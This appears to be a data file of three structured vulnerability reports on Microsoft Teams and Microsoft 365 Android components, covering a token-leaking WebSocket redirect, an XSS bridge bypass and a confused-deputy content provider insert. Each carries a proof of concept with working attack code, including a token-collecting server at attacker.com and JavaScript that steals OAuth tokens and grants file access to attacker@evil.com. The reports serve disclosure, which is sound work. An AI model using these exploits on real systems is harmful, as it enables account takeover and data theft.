{"valid":true,"title":"Server-Redirect URL Injection in Trouter WebSocket Client — Auth Token Exfiltration","summary":"The Microsoft Teams Trouter WebSocket client (in `cmd-trouter-867ceec716d0f66f.js`) processes `trouter.reconnect` Socket.IO events from the server without validating the redirect URL against an allowlist of trusted domains. The `redirectUrlIfPresent()` function in module 902 only checks that the URL ends with `/v4/c` or `/v4/a` — no domain validation is performed.

An attacker who can deliver a Socket.IO `trouter.reconnect` event to the client — specifically while the FSM is in the `AnonymousConnecting` or `WebsocketAuthenticating` state — with payload `{"target":"host","url":"wss://attacker.com"}` will cause the client to:
1. Store `{kind:"redirect",host:"wss://attacker.com"}` as the `fallbackReason`
2. On the next connection attempt, call `redirectUrlIfPresent()` which returns `wss://attacker.com/v4/c`
3. Set `f["skipped handshake data"].websocketUrl` to the attacker-controlled URL
4. `prepareUrl()` in the Socket.IO WebSocket transport reads `options["skipped handshake data"].websocketUrl` and connects to `wss://attacker.com/v4/c`
5. When the socket connects, `sendV4cAuthenticationEvent()` is called and emits an AAD Bearer token or Skype token to the attacker's server

The key precondition is that the attacker must be able to inject a malicious `trouter.reconnect` event — which requires either a man-in-the-middle position on the TLS connection (e.g., rogue/corporate CA), or compromise of the legitimate Trouter server infrastructure. The auth tokens obtained can be used to impersonate the victim user across Microsoft Teams and other Microsoft 365 services.","proofOfConcept":"**Precondition**: Attacker has MITM capability on the TLS connection to the Trouter server (e.g., enterprise proxy with root CA installed on endpoint, or rogue CA).

**Step 1**: Set up a malicious WebSocket server:
```bash
# Install ws
npm install ws
cat > attacker-server.js <<'EOF'
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 443, path: '/v4/c' });
wss.on('connection', (ws) => {
  console.log('[*] Client connected!');
  ws.on('message', (msg) => {
    console.log('[*] Received (auth token exfil):', msg.toString());
  });
});
console.log('Listening on wss://attacker.com/v4/c');
EOF
node attacker-server.js
```

**Step 2**: Intercept the active Socket.IO connection from the Teams client to the legitimate Trouter server and inject a Socket.IO event frame containing:
```json
{"type":"event","name":"trouter.reconnect","args":[{"target":"host","url":"wss://attacker.com"}]}
```
The event must arrive while the FSM is in `AnonymousConnecting` (state=5) or `WebsocketAuthenticating` (state=6), which occurs during initial connection establishment or any reconnect cycle.

**Step 3**: Observe the Teams client:
- It calls `cleanUpAndInitiateReconnect({fallbackReason:{kind:"redirect",host:"wss://attacker.com"}})`
- On reconnect, `redirectUrlIfPresent()` returns `wss://attacker.com/v4/c` (only checks the path suffix, not the domain)
- Socket.IO sets `websocketUrl = "wss://attacker.com/v4/c"` in `skipped handshake data`
- `prepareUrl()` connects to `wss://attacker.com/v4/c`
- Socket `connect` event fires → `sendV4cAuthenticationEvent()` emits `user.authenticate` with the AAD Bearer token or Skype token to attacker's server

**Step 4**: Attacker receives the auth token on the malicious server and can use it to make authenticated API calls to Microsoft Teams/Graph APIs as the victim.","severity":"high"}

{"valid":true,"title":"FluidJSBridge UUID Handshake Bypass via XSS in Self-Contained WebView","summary":"## FluidJSBridge UUID Handshake Insufficiency

The `FluidJSBridge` (`clientFramework`) in the Microsoft 365 Android app registers a JavaScript interface (`j.java`) protecting 50+ sensitive methods with a UUID-based security handshake. The critical flaw is that the **UUID is injected into the very page it is supposed to protect**. In `h.java` around line 690, `securityHandshakeUUID.toString()` is serialized into `n0Var.n` (the `fluidFrameworkInjectedVariables` blob), which is then string-replaced into the HTML loaded via `loadDataWithBaseURL("https://www.office.com", strE12, ...)`. This means every JavaScript running in that WebView page already has the UUID in its scope as part of the injected variable blob.

The UUID validation in `e(String str)` (line ~530) only checks that the passed string matches UUID format and equals `this.f` — the same UUID that was injected into the page. Any JavaScript executing in that WebView — including content injected via XSS into the Fluid/Loop component content — trivially obtains the UUID from the page's variable namespace and can call any `@JavascriptInterface` method. The WebViewClient (`com.microsoft.copilot.imagegenerationrenderer.http.i`, case 1) opens external URLs via `startActivity` for navigation attempts, which does limit cross-origin navigation but does not prevent XSS within the loaded `data:` page content itself. File access is also disabled (`setAllowFileAccessFromFileURLs(false)`, `setAllowUniversalAccessFromFileURLs(false)`).

An attacker who can inject JavaScript into the Fluid/Loop component content (e.g., via a stored XSS in a Microsoft Loop page or SharePoint Fluid document) can read `window.fluidFrameworkInjectedVariables` (or equivalent), extract the UUID, and call `clientFramework.getToken(uuid, scopes)`, `clientFramework.getUserAuthenticationObject(uuid, i)`, or `clientFramework.grantPermissions(uuid, userPrincipalNames)` to steal OAuth tokens, retrieve the full authentication object, or grant arbitrary users permissions to the victim's files — all without any additional user interaction.","proofOfConcept":"## Proof of Concept

**Prerequisites**: Ability to inject JavaScript into a Microsoft Loop page or Fluid component that gets rendered in the M365 Android app's FluidJSBridge WebView (e.g., via stored XSS in Loop content, or a compromised Fluid host document).

**Steps to verify**:

1. **Confirm UUID injection**: Open `h.java` around line 690 and verify `n0Var.n = securityHandshakeUUID.toString()` is included in the serialized `fluidFrameworkInjectedVariables` JSON blob that is embedded in the HTML via `loadDataWithBaseURL`.

2. **Confirm e() validation only checks the UUID**: Read `j.java` method `e(String str)` — it only checks UUID format + equality with `this.f`, with no origin or call-stack verification.

3. **Craft a malicious XSS payload** in a Loop/Fluid document:
```javascript
// Extract the injected UUID from the page variable namespace
const vars = window.fluidFrameworkInjectedVariables; // or however the blob is exposed
const uuid = JSON.parse(vars).securityHandshakeUUID; // field name from n0Var.n

// Call getToken to steal an OAuth token
window.clientFramework.getToken(uuid, JSON.stringify({
  promiseId: 1,
  scopes: ["https://graph.microsoft.com/.default"],
  resourceUrl: "https://graph.microsoft.com"
}));
// Token is returned via the promise/callback mechanism and sent to attacker

// OR call getUserAuthenticationObject
window.clientFramework.getUserAuthenticationObject(uuid, 1);

// OR grant permissions to attacker-controlled email
window.clientFramework.grantPermissions(uuid, JSON.stringify({
  promiseId: 2,
  userPrincipalNames: ["attacker@evil.com"]
}));
```

4. **Observe**: The bridge method executes with full privilege since the UUID matches. OAuth tokens are returned to the JavaScript context, or file permissions are granted to the attacker's account.

**Note**: The exact JavaScript variable name for the UUID in the page can be confirmed by searching for `fluidFrameworkInjectedVariables` in the HTML template resource `owh_fluid_host_layout`.","severity":"high"}

{"valid":true,"title":"BaseAppContextReceiver — Unvalidated contentProviderUri Triggers Arbitrary Content Provider INSERT","summary":"The `BaseAppContextReceiver` (and its 12 subclass variants: `ExcelAppContextReceiver`, `WordAppContextReceiver`, `PPTAppContextReceiver`, etc.) extends `MAMBroadcastReceiver` and implements `onMAMReceive()`. It reads two untrusted Intent extras — `contentProviderUri` (a String) and `uriTypes` (a String array) — from the received broadcast without **any** sender validation, permission check, UID verification, or URI allowlisting.

The attacker's controlled `contentProviderUri` string is passed directly into an async executor task (`androidx.appcompat.view.menu.f` with case `15`). Tracing case 15 in `f.run()`: it stores the string as `aVar2.g`, then (after processing running task info) calls `a.p(aVar2, context, jSONObject)`. Inside `a.p()` (lines 218–243 of `Pdf/pdfdata/dao/a.java`), the URI is parsed via `Uri.parse((String) aVar.g)` and then passed to `MAMContentResolverManagement.insert(contentResolver, uri, contentValues)`. This performs a cross-process ContentResolver INSERT against the attacker-specified URI with app-controlled ContentValues (containing document metadata like webUri, windowsUri, taskId, description). Since `MAMBroadcastReceiver.onReceive()` calls `onMAMReceive()` directly when no `BroadcastReceiverBehavior` is configured (or via behavior otherwise), and the receivers are registered to handle inter-process broadcasts from Excel/Word/PowerPoint sub-processes, **any app that can send a broadcast to these receivers** can trigger an INSERT into an arbitrary content provider accessible to M365. The only guard is `TextUtils.isEmpty()` on the URI string — not a validation of its target.

Impact: A malicious app on the device can send a crafted broadcast causing M365 to INSERT attacker-crafted ContentValues into any exported content provider accessible to M365 — including system providers like Contacts, Calendar, or SMS. This is effectively a confused-deputy attack enabling unauthorized data writes into sensitive content providers on behalf of M365, which holds broad permissions. The severity depends on whether the receivers are exported (no manifest was available to confirm, but they are designed to receive cross-process broadcasts from separate application processes, strongly implying `exported=true`). Impact is unauthorized data modification/injection in content providers accessible to M365.","proofOfConcept":"**Prerequisites**: A malicious app installed on the same Android device as M365 (Microsoft 365).

**Step 1**: Determine the broadcast action these receivers listen to (examine the manifest or use `adb shell dumpsys package com.microsoft.office.officemobile | grep -A5 AppContextReceiver`).

**Step 2**: Write a malicious app that sends a broadcast targeting one of the receivers directly:

```java
Intent intent = new Intent();
// Target the receiver directly by component name
intent.setComponent(new ComponentName(
    "com.microsoft.office.officemobile",
    "com.microsoft.office.officemobile.YPAppContextHandler.ExcelAppContextReceiver"
));
// Set attacker-controlled URI - target any exported content provider M365 can access
intent.putExtra("contentProviderUri", "content://com.android.contacts/raw_contacts");
// uriTypes must be non-null and non-empty to pass the guard
intent.putExtra("uriTypes", new String[]{"web"});
sendBroadcast(intent);
```

**Step 3**: When M365 receives this broadcast, `onMAMReceive()` in `BaseAppContextReceiver` extracts both extras without validation. The executor task (case 15 in `f.run()`) stores the URI and calls `a.p()`, which calls `MAMContentResolverManagement.insert(contentResolver, Uri.parse("content://com.android.contacts/raw_contacts"), contentValues)` — performing an INSERT into the Contacts provider on behalf of M365.

**Step 4**: Verify by checking if a new contact entry was created in the device's Contacts database.

**Alternative URI targets**: `content://com.android.calendar/events`, `content://sms/`, or any other provider accessible with M365's permissions.","severity":"medium"}

